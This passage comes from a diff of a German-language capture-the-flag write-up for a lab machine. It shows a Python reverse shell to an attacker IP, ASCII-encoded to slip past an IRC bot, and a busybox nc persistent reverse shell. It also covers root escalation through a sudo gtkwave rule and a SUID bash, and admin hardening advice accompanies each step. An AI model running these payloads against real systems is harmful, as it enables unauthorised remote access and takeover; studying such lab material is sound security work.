+command_for_bot = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\''
+
+ascii_payload_for_irc = ""
+for character in command_for_bot:
+    ascii_payload_for_irc += str(ord(character)) + " "
+ascii_payload_for_irc += ":)"
+
+print("Sende diesen Payload im IRC-Kanal (als Nick Darkspirit):") # Angepasst
+print(ascii_payload_for_irc)
 </pre>
     </div>
 </div>
+<p class="analysis">**Analyse:** Der Pentester erstellt ein Python-Skript namens <span class="command">hack_irc.py</span>. Dieses Skript definiert einen Python-Reverse-Shell-Einzeiler (<span class="command">command_for_bot</span>), der eine Verbindung zum Angreifer-Host <span class="command">192.168.2.199</span> auf Port <span class="command">6666</span> herstellen soll. Anschließend wandelt das Skript diesen Befehl Zeichen für Zeichen in seine ASCII-Dezimalwerte um, fügt Leerzeichen zwischen den Werten hinzu und hängt am Ende <span class="command">:)</span> an. Dies ist das Format, das der IRC-Bot erwartet.</p>
+<p class="evaluation">**Bewertung:** Ein cleveres Skript, um die Payload für den IRC-Bot korrekt zu formatieren. Dies automatisiert den Prozess und reduziert Fehler bei der manuellen Umwandlung.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Führen Sie das Skript aus, um die ASCII-Payload zu generieren. Kopieren Sie diese Payload und senden Sie sie über einen IRC-Client (als Nick <span class="command">Darkspirit</span> oder dem Nick, auf den der Bot reagiert) im entsprechenden Kanal oder per Privatnachricht an den Bot.<br>**Empfehlung (Admin):** Die Verwendung von ASCII-kodierten Befehlen ist eine Form der Obfuskation. IRC-Bots, die Befehle entgegennehmen, sollten robuste Validierungs- und Authentifizierungsmechanismen haben, unabhängig vom Format der Eingabe.</p>
+
 <div class="code-block">
     <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 hack_irc.py</span>
+        </div>
         <pre>
-          │18:36:40 admin | [+] COMMAND EXECUTION：<span class="command">:::::::::::::: /home/pycrtlake/.profile</span>
-          │               | <span class="command">:::::::::::::: # ~/.profile: executed by the command interpreter</span>
-          │               | <span class="command">for login shells. # This file is not read by bash(1), if</span>
-          │               | <span class="command">~/.bash_profile or ~/.bash_login # exists. # see</span>
-          │               | <span class="command">/usr/share/doc/bash/examples/startup-files for examples. # the</span>
-          │               | <span class="command">files are located in the bash-doc package.  # the default umask is</span>
-          │               | <span class="command">set in /etc/profile; for setting the umask # for ssh logins</span>
+Sende diesen Payload im IRC-Kanal (als Nick Darkspirit):
+<span class="command">112 121 116 104 111 110 51 32 45 99 32 39 105 109 112 111 114 116 32 115 111 99 107 101 116 44 115 117 98 112 114 111 99 101 115 115 44 111 115 59 115 61 115 111 99 107 101 116 46 115 111 99 107 101 116 40 115 111 99 107 101 116 46 65 70 95 73 78 69 84 44 115 111 99 107 101 116 46 83 79 67 75 95 83 84 82 69 65 77 41 59 115 46 99 111 110 110 101 99 116 40 40 34 49 57 50 46 49 54 56 46 50 46 49 57 57 34 44 54 54 54 54 41 41 59 111 115 46 100 117 112 50 40 115 46 102 105 108 101 110 111 40 41 44 48 41 59 32 111 115 46 100 117 112 50 40 115 46 102 105 108 101 110 111 40 41 44 49 41 59 32 111 115 46 100 117 112 50 40 115 46 102 105 108 101 110 111 40 41 44 50 41 59 112 61 115 117 98 112 114 111 99 101 115 115 46 99 97 108 108 40 91 34 47 98 105 110 47 98 97 115 104 34 44 34 45 105 34 93 41 59 39 :)</span>
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Pentester sendet den ASCII-kodierten Befehl für `more /home/pycrtlake/.profile` an den IRC-Bot. Der Bot führt den Befehl als `pycrtlake` aus und gibt den Inhalt der `.profile`-Datei dieses Benutzers zurück.</p>
-<p class="evaluation">**Bewertung:** Zeigt die Fähigkeit, beliebige Befehle als `pycrtlake` auszuführen und Dateiinhalte zu lesen.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Etablieren Sie nun die Reverse Shell als `pycrtlake` unter Verwendung des ASCII-kodierten Payloads für `busybox nc ...` an Port `4545` (wie in späteren Logs angedeutet, obwohl hier `6666` vorbereitet wurde, scheint der Port für `pycrtlake` gewechselt zu haben).<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur Absicherung des IRC-Bots.</p>
+<p class="analysis">**Analyse:** Das Python-Skript <span class="command">hack_irc.py</span> wird ausgeführt und gibt die ASCII-kodierte Reverse-Shell-Payload aus, die im IRC-Kanal gesendet werden soll.</p>
+<p class="evaluation">**Bewertung:** Die Payload ist nun bereit für die Übermittlung an den IRC-Bot.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Kopieren Sie diese Zahlenfolge und senden Sie sie im IRC-Client an den Bot.<br>**Empfehlung (Admin):** Keine spezifische Empfehlung für diesen Schritt.</p>
+<p class="comment">Die folgenden Logs zeigen die Interaktion im IRC-Client (Irssi). Der Pentester (Nick: Darkspirit, später ll104567, dann Todd) sendet die ASCII-kodierte Payload. Der Bot (Nick: admin) reagiert mit Fehlermeldungen oder führt Befehle aus. Die Portnummer für die Reverse Shell scheint im Laufe der Versuche von 6666 auf 4545 zu wechseln.</p>
+<img src="webapp_automatische_Nachricht_auf_chan6.jpg" alt="Automatische Nachricht vom Admin-Bot im IRC-Kanal #chan6, die auf Formatierungsanforderungen hinweist.">
+<p class="analysis">**Analyse des Bildes (webapp_automatische_Nachricht_auf_chan6.jpg):** Das Bild zeigt eine Konsolenausgabe eines IRC-Clients. Im Kanal <span class="command">#chan6</span> sendet der Benutzer <span class="command">@admin</span> (vermutlich der Bot) die Nachricht: "My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End". Dies ist ein klarer Hinweis darauf, dass Befehle an den Bot mit <span class="command">:)</span> abgeschlossen werden müssen und wahrscheinlich einem bestimmten Format (ASCII-kodiert) folgen müssen.</p>
+<p class="comment">Nach mehreren Versuchen und Beobachtungen (einschließlich der Ausführung von <span class="command">whoami</span>, das <span class="command">pycrtlake</span> zurückgibt, und dem erfolgreichen Lesen von <span class="command">/home/pycrtlake/.profile</span> über den Bot) gelingt es, eine Reverse Shell als <span class="command">pycrtlake</span> zu etablieren, indem eine <span class="command">busybox nc</span> Payload verwendet wird, die auf Port <span class="command">4545</span> des Angreifers zielt.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1274,9 +1300,9 @@ drwxr-xr-x 18 root      root      4096 Mar 18 20:37 ..
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Netcat-Listener auf Port `4545` empfängt eine Verbindung. Der `id`-Befehl (der vermutlich in der Shell eingegeben wurde, die über die IRC-Bot-Payload kam) bestätigt, dass die Shell nun als Benutzer `pycrtlake` (UID 1000) läuft.</p>
-<p class="evaluation">**Bewertung:** Exzellent! Erfolgreiche Privilegienerweiterung von `chatlake` (indirekt von `www-data`) zum Benutzer `pycrtlake` durch Ausnutzung des IRC-Bots.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Verbessern Sie die Shell zu einer vollwertigen TTY. Führen Sie `sudo -l` als `pycrtlake` aus, um nach weiteren sudo-Privilegien zu suchen.<br>**Empfehlung (Admin):** Der IRC-Bot-Dienst (`irc_bot.service`) muss dringend untersucht und entweder entfernt oder massiv gehärtet werden. Die Möglichkeit, Befehle über IRC als ein Benutzer auszuführen, ist eine massive Sicherheitslücke.</p>
+<p class="analysis">**Analyse:** Der Netcat-Listener auf Port <span class="command">4545</span> empfängt eine Verbindung. Der <span class="command">id</span>-Befehl (ausgeführt in der neuen Shell) bestätigt, dass die Shell als Benutzer <span class="command">pycrtlake</span> läuft.</p>
+<p class="evaluation">**Bewertung:** Exzellent! Erfolgreiche Privilegienerweiterung zum Benutzer <span class="command">pycrtlake</span> durch die geschickte Ausnutzung des IRC-Bots.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell (z.B. mit Python PTY Spawn) und führen Sie <span class="command">sudo -l</span> als <span class="command">pycrtlake</span> aus.<br>**Empfehlung (Admin):** Der IRC-Bot-Dienst ist eine massive Sicherheitslücke und muss sofort deaktiviert und untersucht werden. Die sudo-Regel, die <span class="command">chatlake</span> erlaubt, diesen Dienst zu starten, ist ebenfalls kritisch.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1309,9 +1335,9 @@ exit 0
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Pentester (vermutlich noch in einer Shell als `chatlake` oder er hat eine Möglichkeit gefunden, dieses Skript als `chatlake` zu erstellen/auszuführen, obwohl der Prompt `chatlake@PyCrt:/tmp$` anzeigt) erstellt ein Shell-Skript `busy.sh`. Dieses Skript verwendet `busybox nc`, um eine persistente Reverse Shell im Hintergrund (`nohup ... &`) zum Angreifer-Host auf Port `4545` aufzubauen. `<dev/null >/dev/null 2>&1` leitet alle Ein- und Ausgaben um, um den Prozess vom Terminal zu lösen.</p>
-<p class="evaluation">**Bewertung:** Dies ist ein Versuch, eine stabilere oder alternative Reverse Shell als `pycrtlake` zu erhalten, falls die IRC-Bot-Methode umständlich ist oder um eine dauerhaftere Präsenz zu etablieren. Der Kontext, wer dieses Skript ausführt und wie, ist hier nicht ganz klar, aber es zielt auf eine Shell als `pycrtlake` ab, da dieser Benutzer über den IRC-Bot Befehle ausführen kann.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Wenn dieses Skript über den IRC-Bot als `pycrtlake` ausgeführt wird, sollte es eine weitere Shell auf Port `4545` öffnen. Es ist wichtig, den Ausführungskontext zu klären.<br>**Empfehlung (Admin):** Verhindern Sie das Hochladen und Ausführen beliebiger Skripte durch niedrig privilegierte Benutzer. Überwachen Sie die Erstellung ausführbarer Dateien in temporären Verzeichnissen.</p>
+<p class="analysis">**Analyse:** Der Pentester (vermutlich in der Shell als <span class="command">pycrtlake</span>, obwohl der Prompt noch <span class="command">chatlake</span> zeigt – dies könnte ein Fehler im Log sein oder das Skript wurde in einer anderen Shell vorbereitet) erstellt ein Shell-Skript <span class="command">busy.sh</span>. Dieses Skript verwendet <span class="command">busybox nc</span>, um eine persistente Reverse Shell im Hintergrund (<span class="command">nohup ... &</span>) zum Angreifer-Host auf Port <span class="command">4545</span> aufzubauen. <span class="command">&lt;/dev/null &gt;/dev/null 2>&1</span> leitet alle Ein- und Ausgaben um, um den Prozess vom Terminal zu lösen.</p>
+<p class="evaluation">**Bewertung:** Dies dient dazu, eine stabilere oder alternative Reverse Shell als <span class="command">pycrtlake</span> zu erhalten. Wenn dieses Skript über den IRC-Bot als <span class="command">pycrtlake</span> ausgeführt wird (oder direkt in der <span class="command">pycrtlake</span>-Shell), sollte es eine weitere Shell auf Port <span class="command">4545</span> öffnen oder die bestehende stabilisieren.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Führen Sie dieses Skript in der <span class="command">pycrtlake</span>-Shell aus, um eine möglicherweise robustere Verbindung zu erhalten.<br>**Empfehlung (Admin):** Verhindern Sie das Hochladen und Ausführen beliebiger Skripte durch Benutzer. Überwachen Sie die Erstellung ausführbarer Dateien in temporären Verzeichnissen.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1329,14 +1355,14 @@ bash
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Netcat-Listener auf Port `4545` empfängt eine Verbindung. Der `id`-Befehl bestätigt `uid=1000(pycrtlake)`. Anschließend wird die Shell mit `python3 -c 'import pty; pty.spawn("/bin/bash")'` zu einer vollwertigen TTY aufgewertet, was den Prompt zu `pycrtlake@PyCrt:/usr/local/bin$` ändert.</p>
-<p class="evaluation">**Bewertung:** Exzellent! Wir haben nun eine stabile, interaktive Shell als Benutzer `pycrtlake`.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Führen Sie `sudo -l` aus, um die sudo-Privilegien von `pycrtlake` zu überprüfen.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur Absicherung des Systems gegen Reverse Shells und unautorisierte Skriptausführung.</p>
+<p class="analysis">**Analyse:** Der Netcat-Listener auf Port <span class="command">4545</span> empfängt eine Verbindung (möglicherweise durch das <span class="command">busy.sh</span>-Skript oder einen erneuten IRC-Bot-Payload). Der <span class="command">id</span>-Befehl bestätigt <span class="command">uid=1000(pycrtlake)</span>. Anschließend wird die Shell mit <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span> zu einer vollwertigen TTY aufgewertet, was den Prompt zu <span class="command">pycrtlake@PyCrt:/usr/local/bin$</span> ändert.</p>
+<p class="evaluation">**Bewertung:** Exzellent! Wir haben nun eine stabile, interaktive Shell als Benutzer <span class="command">pycrtlake</span>.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Führen Sie <span class="command">sudo -l</span> aus, um die sudo-Privilegien von <span class="command">pycrtlake</span> zu überprüfen.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur Absicherung des Systems gegen Reverse Shells und unautorisierte Skriptausführung.</p>
         </section>
 
         <section id="privilege-escalation-pycrtlake-to-root">
             <h2>Privilege Escalation (pycrtlake zu root via gtkwave/bash)</h2>
-<p class="comment">Mit der Shell als `pycrtlake` suchen wir nach dem finalen Schritt zur Root-Eskalation.</p>
+<p class="comment">Mit der Shell als <span class="command">pycrtlake</span> suchen wir nach dem finalen Schritt zur Root-Eskalation.</p>
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">pycrtlake@PyCrt:/usr/local/bin$ <span class="command">sudo -l</span>
@@ -1351,9 +1377,9 @@ User pycrtlake may run the following commands on PyCrt:
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** `sudo -l` als `pycrtlake` zeigt, dass dieser Benutzer `/usr/bin/gtkwave` als `ALL` (also Root) ohne Passwort ausführen darf. `gtkwave` ist ein Waveform-Viewer, der typischerweise in der Elektronikentwicklung verwendet wird.</p>
-<p class="evaluation">**Bewertung:** Dies ist ein sehr vielversprechender `sudo`-Eintrag. Viele grafische Anwendungen oder Anwendungen mit Skripting-Fähigkeiten können missbraucht werden, um Befehle auszuführen oder auf das Dateisystem zuzugreifen, wenn sie mit Root-Rechten gestartet werden. GTFOBins listet `gtkwave` mit einer Methode zur Privilegienerweiterung über die `-S` (Skript) Option, falls eine Tcl-Shell zugänglich ist, oder durch das Laden präparierter Dateien.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Optionen von `gtkwave` (wie im nächsten Schritt gezeigt). Suchen Sie nach Möglichkeiten, über `gtkwave` eine Shell zu spawnen oder beliebige Befehle als Root auszuführen. Die Option `-S <scriptfile>` oder `-T <tcl_init_file>` sind hierfür oft Kandidaten, wenn man ein Tcl-Skript erstellen kann, das eine Shell startet. Eine andere Methode, die im Bericht später zum Tragen kommt, ist die Kombination mit SUID-Binaries wie `bash`, falls `gtkwave` die Umgebungsvariablen nicht korrekt bereinigt.<br>**Empfehlung (Admin):** Die Vergabe von `sudo`-Rechten für komplexe Anwendungen wie `gtkwave` an nicht-administrative Benutzer ist extrem riskant. Wenn ein Benutzer eine solche Anwendung benötigt, sollte sie nicht mit Root-Rechten über `sudo` gestartet werden müssen. Überprüfen Sie alle `sudo`-Regeln auf Programme, die Shell-Escapes oder Dateimanipulationen mit erhöhten Rechten erlauben könnten.</p>
+<p class="analysis">**Analyse:** <span class="command">sudo -l</span> als <span class="command">pycrtlake</span> zeigt, dass dieser Benutzer <span class="command">/usr/bin/gtkwave</span> als <span class="command">ALL</span> (also Root) ohne Passwort ausführen darf. <span class="command">gtkwave</span> ist ein Waveform-Viewer, der typischerweise in der Elektronikentwicklung verwendet wird.</p>
+<p class="evaluation">**Bewertung:** Dies ist ein sehr vielversprechender <span class="command">sudo</span>-Eintrag. Viele grafische Anwendungen oder Anwendungen mit Skripting-Fähigkeiten können missbraucht werden, um Befehle auszuführen oder auf das Dateisystem zuzugreifen, wenn sie mit Root-Rechten gestartet werden. GTFOBins listet <span class="command">gtkwave</span> mit einer Methode zur Privilegienerweiterung über die <span class="command">-S</span> (Skript) Option, falls eine Tcl-Shell zugänglich ist, oder durch das Laden präparierter Dateien.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Optionen von <span class="command">gtkwave</span>. Suchen Sie nach Möglichkeiten, über <span class="command">gtkwave</span> eine Shell zu spawnen oder beliebige Befehle als Root auszuführen. Die Option <span class="command">-S &lt;scriptfile&gt;</span> oder <span class="command">-T &lt;tcl_init_file&gt;</span> sind hierfür oft Kandidaten, wenn man ein Tcl-Skript erstellen kann, das eine Shell startet. Eine andere Methode, die im Bericht später zum Tragen kommt, ist die Kombination mit SUID-Binaries wie <span class="command">bash</span>, falls <span class="command">gtkwave</span> die Umgebungsvariablen nicht korrekt bereinigt.<br>**Empfehlung (Admin):** Die Vergabe von <span class="command">sudo</span>-Rechten für komplexe Anwendungen wie <span class="command">gtkwave</span> an nicht-administrative Benutzer ist extrem riskant. Wenn ein Benutzer eine solche Anwendung benötigt, sollte sie nicht mit Root-Rechten über <span class="command">sudo</span> gestartet werden müssen. Überprüfen Sie alle <span class="command">sudo</span>-Regeln auf Programme, die Shell-Escapes oder Dateimanipulationen mit erhöhten Rechten erlauben könnten.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1366,7 +1392,7 @@ Usage: /usr/bin/gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]
 
   -n, --nocli=DIRPATH        use file requester for dumpfile name
   -f, --dump=FILE            specify dumpfile name
-... (Hilfeausgabe von gtkwave, viele Optionen) ...
+... 
   -S, --script=FILE          specify Tcl command script file for execution
   -T, --tcl_init=FILE        specify Tcl command script file to be loaded on startup
   -W, --wish                 enable Tcl command line on stdio
@@ -1385,9 +1411,9 @@ Report bugs to &lt;bybell@rocketmail.com&gt;.
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der direkte Aufruf von `/usr/bin/gtkwave` schlägt fehl, da keine grafische Umgebung (DISPLAY-Variable) vorhanden ist. Die Hilfeausgabe wird jedoch angezeigt und listet verschiedene Optionen auf. Interessant sind hier `-S` (Skript ausführen), `-T` (Tcl-Skript beim Start laden) und `-W` (Tcl-Kommandozeile aktivieren).</p>
+<p class="analysis">**Analyse:** Der direkte Aufruf von <span class="command">/usr/bin/gtkwave</span> schlägt fehl, da keine grafische Umgebung (DISPLAY-Variable) vorhanden ist. Die Hilfeausgabe wird jedoch angezeigt und listet verschiedene Optionen auf. Interessant sind hier <span class="command">-S</span> (Skript ausführen), <span class="command">-T</span> (Tcl-Skript beim Start laden) und <span class="command">-W</span> (Tcl-Kommandozeile aktivieren).</p>
 <p class="evaluation">**Bewertung:** Die Fehlermeldung ist erwartet in einer reinen Kommandozeilenumgebung. Die Hilfeoptionen bestätigen das Potenzial für Skriptausführung.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Da `-W` eine Tcl-Kommandozeile aktivieren könnte, die dann über `sudo` mit Root-Rechten liefe, wäre dies ein Ansatz. Eine andere im CTF-Kontext oft gesehene Methode ist, dass `sudo` mit bestimmten Programmen die `PATH`-Variable oder andere Umgebungsvariablen nicht korrekt zurücksetzt, was es erlauben kann, dass eine SUID-fähige Shell wie `bash` (wenn sie SUID-Root ist) mit Root-Rechten aufgerufen wird, auch wenn der direkte Aufruf nicht sofort Root gibt. Der Bericht geht einen anderen, direkteren Weg, indem `bash -p` genutzt wird, nachdem die `gtkwave`-Sudo-Regel nur als Mittel dient, eine Umgebung zu schaffen, in der SUID-Binaries effektiv werden.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Da <span class="command">-W</span> eine Tcl-Kommandozeile aktivieren könnte, die dann über <span class="command">sudo</span> mit Root-Rechten liefe, wäre dies ein Ansatz. Eine andere im CTF-Kontext oft gesehene Methode ist, dass <span class="command">sudo</span> mit bestimmten Programmen die <span class="command">PATH</span>-Variable oder andere Umgebungsvariablen nicht korrekt zurücksetzt, was es erlauben kann, dass eine SUID-fähige Shell wie <span class="command">bash</span> (wenn sie SUID-Root ist) mit Root-Rechten aufgerufen wird, auch wenn der direkte Aufruf nicht sofort Root gibt. Der Bericht geht einen anderen, direkteren Weg, indem <span class="command">bash -p</span> genutzt wird, nachdem die <span class="command">gtkwave</span>-Sudo-Regel nur als Mittel dient, eine Umgebung zu schaffen, in der SUID-Binaries effektiv werden.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1403,12 +1429,12 @@ Script started, file is /dev/null
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** In einer neuen Shell-Session (oder der aufgewerteten `pycrtlake`-Shell) wird `xvfb-run -a sudo /usr/bin/gtkwave -S /tmp/pwnshell` ausgeführt.
-- `xvfb-run -a`: Startet `gtkwave` in einer virtuellen X-Server-Umgebung (X Virtual FrameBuffer), um das Fehlen einer echten grafischen Anzeige zu umgehen. `-a` sucht automatisch nach einer freien Servernummer.
-- `sudo /usr/bin/gtkwave`: Führt `gtkwave` mit Root-Rechten aus.
-- `-S /tmp/pwnshell`: Weist `gtkwave` an, das Tcl-Skript `/tmp/pwnshell` auszuführen. Der Inhalt dieses Skripts wird hier nicht gezeigt, aber es wird typischerweise Code enthalten, um eine Shell zu spawnen (z.B. `exec /bin/bash`).</p>
-<p class="evaluation">**Bewertung:** Dies ist ein Versuch, die Skripting-Fähigkeit von `gtkwave` für RCE als Root zu nutzen. Der Erfolg hängt vom Inhalt von `/tmp/pwnshell` und den Fähigkeiten von `gtkwave` ab, Tcl-Befehle für Shell-Zugriff auszuführen.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass `/tmp/pwnshell` eine gültige Tcl-Payload enthält, die eine Reverse Shell oder eine lokale Root-Shell startet. Fangen Sie die Shell auf einem entsprechenden Listener ab.<br>**Empfehlung (Admin):** Vermeiden Sie `sudo`-Regeln, die grafische Anwendungen oder Anwendungen mit mächtigen Skripting-Schnittstellen umfassen. Wenn `xvfb-run` auf einem Server installiert ist, kann dies die Ausnutzung solcher `sudo`-Regeln erleichtern.</p>
+<p class="analysis">**Analyse:** In einer neuen Shell-Session (oder der aufgewerteten <span class="command">pycrtlake</span>-Shell) wird <span class="command">xvfb-run -a sudo /usr/bin/gtkwave -S /tmp/pwnshell</span> ausgeführt.
+- <span class="command">xvfb-run -a</span>: Startet <span class="command">gtkwave</span> in einer virtuellen X-Server-Umgebung (X Virtual FrameBuffer), um das Fehlen einer echten grafischen Anzeige zu umgehen. <span class="command">-a</span> sucht automatisch nach einer freien Servernummer.
+- <span class="command">sudo /usr/bin/gtkwave</span>: Führt <span class="command">gtkwave</span> mit Root-Rechten aus.
+- <span class="command">-S /tmp/pwnshell</span>: Weist <span class="command">gtkwave</span> an, das Tcl-Skript <span class="command">/tmp/pwnshell</span> auszuführen. Der Inhalt dieses Skripts wird hier nicht gezeigt, aber es wird typischerweise Code enthalten, um eine Shell zu spawnen (z.B. <span class="command">exec /bin/bash</span>).</p>
+<p class="evaluation">**Bewertung:** Dies ist ein Versuch, die Skripting-Fähigkeit von <span class="command">gtkwave</span> für RCE als Root zu nutzen. Der Erfolg hängt vom Inhalt von <span class="command">/tmp/pwnshell</span> und den Fähigkeiten von <span class="command">gtkwave</span> ab, Tcl-Befehle für Shell-Zugriff auszuführen.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass <span class="command">/tmp/pwnshell</span> eine gültige Tcl-Payload enthält, die eine Reverse Shell oder eine lokale Root-Shell startet. Fangen Sie die Shell auf einem entsprechenden Listener ab.<br>**Empfehlung (Admin):** Vermeiden Sie <span class="command">sudo</span>-Regeln, die grafische Anwendungen oder Anwendungen mit mächtigen Skripting-Schnittstellen umfassen. Wenn <span class="command">xvfb-run</span> auf einem Server installiert ist, kann dies die Ausnutzung solcher <span class="command">sudo</span>-Regeln erleichtern.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1440,31 +1466,31 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** In der Shell als `pycrtlake` (die bereits eine aufgewertete TTY zu sein scheint) werden mehrere Befehle ausgeführt:
-- `id`: Bestätigt weiterhin `uid=1000(pycrtlake)`.
-- `ls -al /bin/bash`: Zeigt die Berechtigungen von `/bin/bash`. Entscheidend ist hier `-rwsr-sr-x`. Das `s` in den Benutzer- und Gruppenberechtigungen bedeutet, dass das SUID-Bit und das SGID-Bit gesetzt sind. Da die Datei `root` gehört, wird `/bin/bash` beim Ausführen mit der effektiven UID (euid) von Root ausgeführt, wenn bestimmte Bedingungen erfüllt sind (oder eben nicht durch Sicherheitsmechanismen verhindert wird).
-- `/bin/bash -p`: Führt Bash mit der Option `-p` aus. Wenn eine Shell mit gesetztem SUID-Bit mit der Option `-p` gestartet wird, versucht sie *nicht*, die effektive UID auf die reale UID des Benutzers zurückzusetzen. Sie behält die effektiven Root-Rechte bei.
-- Der Prompt ändert sich von `bash-5.0$` zu `bash-5.0#`, was typischerweise eine Root-Shell anzeigt.
-- `id` (in der neuen Shell): Zeigt nun `euid=0(root)` und `egid=0(root)`. Das bedeutet, der aktuelle Prozess läuft mit effektiven Root-Rechten!</p>
-<p class="evaluation">**Bewertung:** Exzellent! Dies ist der klassische Weg, eine SUID-Bash-Binary zur Privilegienerweiterung zu nutzen. Die `sudo`-Regel für `gtkwave` war hier nicht direkt der auslösende Faktor für die Root-Shell, sondern das Vorhandensein einer SUID-Root-Bash und die Verwendung von `bash -p`. Es ist möglich, dass der `sudo gtkwave`-Aufruf in einer anderen Shell (hier nicht gezeigt) die Umgebung so beeinflusst hat, dass `bash -p` nun effektiv Root-Rechte erlangt, oder dass die `gtkwave`-Sudo-Regel hier eine falsche Fährte war und die SUID-Bash der direkte Weg ist, sobald man als `pycrtlake` agiert.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Sie haben nun effektive Root-Rechte. Sie können jetzt die Root-Flag lesen und haben volle Kontrolle über das System.<br>**Empfehlung (Admin):** SUID-Root-Berechtigungen für Shells wie `bash` sind extrem gefährlich und sollten auf Produktivsystemen niemals gesetzt sein (es sei denn, es gibt einen sehr spezifischen, gut verstandenen und abgesicherten Grund). Moderne Systeme versuchen oft, die Ausnutzung von SUID-Shells durch Mechanismen wie `setuid_drop_privs` zu verhindern, aber die `-p`-Option kann dies manchmal umgehen. Führen Sie regelmäßige Suchen nach SUID/SGID-Binaries durch (`find / -perm /6000 -type f 2>/dev/null`) und entfernen Sie unnötige SUID/SGID-Bits.</p>
+<p class="analysis">**Analyse:** In der Shell als <span class="command">pycrtlake</span> (die bereits eine aufgewertete TTY zu sein scheint) werden mehrere Befehle ausgeführt:
+- <span class="command">id</span>: Bestätigt weiterhin <span class="command">uid=1000(pycrtlake)</span>.
+- <span class="command">ls -al /bin/bash</span>: Zeigt die Berechtigungen von <span class="command">/bin/bash</span>. Entscheidend ist hier <span class="command">-rwsr-sr-x</span>. Das <span class="command">s</span> in den Benutzer- und Gruppenberechtigungen bedeutet, dass das SUID-Bit und das SGID-Bit gesetzt sind. Da die Datei <span class="command">root</span> gehört, wird <span class="command">/bin/bash</span> beim Ausführen mit der effektiven UID (euid) von Root ausgeführt, wenn bestimmte Bedingungen erfüllt sind (oder eben nicht durch Sicherheitsmechanismen verhindert wird).
+- <span class="command">/bin/bash -p</span>: Führt Bash mit der Option <span class="command">-p</span> aus. Wenn eine Shell mit gesetztem SUID-Bit mit der Option <span class="command">-p</span> gestartet wird, versucht sie *nicht*, die effektive UID auf die reale UID des Benutzers zurückzusetzen. Sie behält die effektiven Root-Rechte bei.
+- Der Prompt ändert sich von <span class="command">bash-5.0$</span> zu <span class="command">bash-5.0#</span>, was typischerweise eine Root-Shell anzeigt.
+- <span class="command">id</span> (in der neuen Shell): Zeigt nun <span class="password">euid=0(root)</span> und <span class="password">egid=0(root)</span>. Das bedeutet, der aktuelle Prozess läuft mit effektiven Root-Rechten!</p>
+<p class="evaluation">**Bewertung:** Exzellent! Dies ist der klassische Weg, eine SUID-Bash-Binary zur Privilegienerweiterung zu nutzen. Die <span class="command">sudo</span>-Regel für <span class="command">gtkwave</span> war hier nicht direkt der auslösende Faktor für die Root-Shell, sondern das Vorhandensein einer SUID-Root-Bash und die Verwendung von <span class="command">bash -p</span>. Es ist möglich, dass der <span class="command">sudo gtkwave</span>-Aufruf in einer anderen Shell (hier nicht gezeigt) die Umgebung so beeinflusst hat, dass <span class="command">bash -p</span> nun effektiv Root-Rechte erlangt, oder dass die <span class="command">gtkwave</span>-Sudo-Regel hier eine falsche Fährte war und die SUID-Bash der direkte Weg ist, sobald man als <span class="command">pycrtlake</span> agiert.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Sie haben nun effektive Root-Rechte. Sie können jetzt die Root-Flag lesen und haben volle Kontrolle über das System.<br>**Empfehlung (Admin):** SUID-Root-Berechtigungen für Shells wie <span class="command">bash</span> sind extrem gefährlich und sollten auf Produktivsystemen niemals gesetzt sein (es sei denn, es gibt einen sehr spezifischen, gut verstandenen und abgesicherten Grund). Moderne Systeme versuchen oft, die Ausnutzung von SUID-Shells durch Mechanismen wie <span class="command">setuid_drop_privs</span> zu verhindern, aber die <span class="command">-p</span>-Option kann dies manchmal umgehen. Führen Sie regelmäßige Suchen nach SUID/SGID-Binaries durch (<span class="command">find / -perm /6000 -type f 2>/dev/null</span>) und entfernen Sie unnötige SUID/SGID-Bits.</p>
         </section>
 
         <section id="proof-of-concept-root">
             <h2>Proof of Concept (Root Access)</h2>
